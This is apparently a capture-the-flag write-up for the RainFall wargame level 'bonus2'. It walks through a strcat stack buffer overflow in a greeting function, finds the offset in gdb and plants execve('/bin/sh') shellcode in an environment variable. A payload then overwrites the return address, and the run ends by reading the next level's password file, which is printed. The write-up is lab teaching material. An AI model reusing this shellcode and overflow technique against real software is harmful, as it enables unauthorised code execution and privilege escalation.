```
    int greet_user(const char* name) 
    {
        char greeting[100] = {0};

        if (language == 1) 
        {
            memcpy(greeting, "Hyvää päivää", 18);
        } 
        else if (language == 2) 
        {
            strcpy(greeting, "Goedemiddag! ");
        } 
        else 
        {
            strncpy(greeting, "Hello ", 7);
        }

        // Append the name provided by the user
        strcat(greeting, name);

        // Print the final greeting
        return puts(greeting);
    }
```

In the function greet_user it create a buffer char greeting[100] and if the the environment variable LANG=fi, the program uses memcpy(greeting, "Hyvää päivää", 18); to initialize the buffer then it calls strcat(greeting, name);
The problem here is that strcat() appends name without bounds checking and name is max 32 bytes long, and greeting has 100 bytes but But memcpy already writes 18 bytes. That leaves 82 bytes, not 100.
So if name exceeds 82 bytes in total length, a stack buffer overflow is possible.

export LANG=fi

```
    (gdb) run hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
    Starting program: /home/user/bonus2/bonus2 hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
    Hyvää päivää hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

    Program received signal SIGSEGV, Segmentation fault.
    0x41366141 in ?? ()
```

So the offset is 18

- shellcode:

```
    export code="$(python -c 'print("\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')"
```

```
   (gdb) start
   (gdb) p/x getenv("code")
   $1 = 0xbfffff89
   (gdb) x/s 0xbfffff89
   0xbfffff89:      "1\300\061\333\260\006\315\200Sh/ttyh/dev\211\343\061\311f\271\022'\260\005\315\200\061\300Ph//shh/bin\211\343PS\211\341\231\260\v\315\200"
```
The address of our shellcode is 0xbfffff89 in little-indian => "\x89\xff\xff\xbf"

- payload:

hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh is for satisfying char buffer_name[76] => strncpy(buffer_name, argv[1], 40);

$(python -c "print("A" * 18 + "[ Shellcode Address ]")')

```
    bonus2@RainFall:~$ ./bonus2 hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh $(python -c 'print("A" * 18 + "\x89\xff\xff\xbf")')
    Hyvää päivää hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhAAAAAAAAAAAAAAAAAA����
    $ cat /home/user/bonus3/.pass
    71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```